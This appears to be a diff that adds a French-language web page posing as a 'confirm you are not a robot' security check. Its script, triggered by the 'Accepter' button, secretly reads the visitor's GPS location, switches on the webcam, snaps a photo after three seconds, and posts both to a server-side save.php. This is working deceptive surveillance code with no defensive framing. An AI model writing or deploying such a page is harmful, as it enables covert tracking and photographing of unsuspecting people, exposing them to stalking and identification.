@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification Sécurisée</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+    <h3>Veuillez confirmer que vous n'est pas un robot</h3>
+    <p>Cliquez sur le bouton ci-dessous pour terminer la vérification.</p>
+    <button onclick="startCapture()">Accepter</button>
+</div>
+
+<script>
+function startCapture() {
+    // Maka GPS
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendData({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
+        });
+    }
+
+    // Maka selfie
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            sendData({ image: imageData });
+            alert('Vérification terminée');
+        }, 3000);
+    })
+    .catch(() => alert('Accès caméra refusé'));
+}
+
+function sendData(data) {
+    fetch('save.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    });
+}
+</script>
+</body>
+</html>
